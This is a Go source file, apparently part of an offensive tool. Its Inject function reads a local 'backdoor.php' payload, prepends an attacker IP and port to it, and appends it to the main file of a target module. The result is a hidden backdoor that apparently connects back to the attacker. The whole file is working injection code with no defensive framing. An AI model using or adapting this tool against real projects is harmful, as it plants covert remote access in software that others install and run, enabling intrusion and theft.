package internals

import (
	"fmt"
	"os"
	"strings"

	"data"
	"utils"
)

func addAddressToString(addr data.Address, str *string) {
	*str = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *str
}

func findModuleName(path string) string {
	var pathSplitted []string = strings.Split(path, "/")
	return pathSplitted[len(pathSplitted) - 1]
}

func Inject(addr data.Address, path string) error {
	currentDirectory, _ := os.Getwd()
	var backdoorPath string = currentDirectory + "/backdoor.php"
	var moduleName string = findModuleName(path)

	mainFile, err := findMainFileDirectory(path, moduleName)
	if err != nil {
		return err
	}

	mainFilePath := path + "/" + mainFile
	return injectBackDoor(addr, mainFilePath, backdoorPath)
}

func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
	backdoor, err := utils.ReadFile(backdoorPath)
	if err == nil {
		addAddressToString(addr, &backdoor)
		err = utils.AppendToFile(backdoor, filePath)
	}

	return err
}